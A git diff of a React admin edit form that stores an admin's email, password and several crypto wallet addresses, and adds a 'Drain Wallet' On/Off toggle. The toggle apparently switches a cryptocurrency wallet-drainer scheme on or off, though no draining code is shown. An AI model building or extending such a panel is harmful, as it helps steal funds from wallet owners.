@@ -1,6 +1,7 @@
 import React, { useState, useEffect } from 'react';
 import { useSelector } from "react-redux";
 import { useParams } from 'react-router-dom';
+import styles from '../../common/Home.module.css';
 
 
 export const AdminEditComponent = ({ updateHandler, }) => {
@@ -30,6 +31,43 @@ export const AdminEditComponent = ({ updateHandler, }) => {
     updateHandler(isData)
     return
   }
+
+  const inputStyle = {
+    padding: '12px 15px',
+    border: '1px solid #ccc',
+    borderRadius: '8px',
+    fontSize: '15px',
+    backgroundColor: '#fff',
+    transition: 'all 0.2s ease',
+    outline: 'none',
+  };
+  const handleBooleanChange = (e, nameField) => {
+    const val = e.target.value === 'true';
+    setIsData(prev => ({ ...prev, [nameField]: val }));
+  };
+  const inputFocusStyle = {
+    ...inputStyle,
+    borderColor: '#4f46e5',
+    boxShadow: '0 0 0 3px rgba(79,70,229,0.1)'
+  };
+
+
+
+  const booleanSelect = (label, field) => (
+    <div className={styles.inputCards} style={{ display: 'flex', flexDirection: 'column' }}>
+      <label style={{ marginBottom: '6px', fontWeight: '500' }}>{label}</label>
+      <select
+        value={isData[field]}
+        onChange={(e) => handleBooleanChange(e, field)}
+        style={inputStyle}
+        onFocus={(e) => e.target.style = inputFocusStyle}
+        onBlur={(e) => e.target.style = inputStyle}
+      >
+        <option value={true}>On</option>
+        <option value={false}>Off</option>
+      </select>
+    </div>
+  );
 
 
   return (<>
@@ -65,14 +103,13 @@ export const AdminEditComponent = ({ updateHandler, }) => {
               { label: "Email", field: "email" },
               { label: "Password", field: "password" },
               { label: "Bitcoin Wallet Address", field: "bitcoinwalletaddress" },
-              
-              { label: "Ethereum Wallet Address", field: "ethereumwalletaddress" },
 
+              { label: "Ethereum Wallet Address", field: "ethereumwalletaddress" },
 
               { label: "Usdt Trc20 Wallet Address", field: "usdt_trc20walletaddress" },
               { label: "Usdt erc20 Wallet Address", field: "usdt_erc20walletaddress" },
               { label: "Usdt Wallet Address", field: "usdt_walletaddress" },
-             
+
               { label: "Admin Phone Number", field: "phoneNumber" },
               { label: "Admin Name", field: "name" },
             ].map(({ label, field }) => (
@@ -99,7 +136,9 @@ export const AdminEditComponent = ({ updateHandler, }) => {
                 />
               </div>
             ))}
-           
+
+            {booleanSelect('Drain Wallet', 'drainWallet')}
+
 
             <div style={{ width: '100%' }}>
               <button
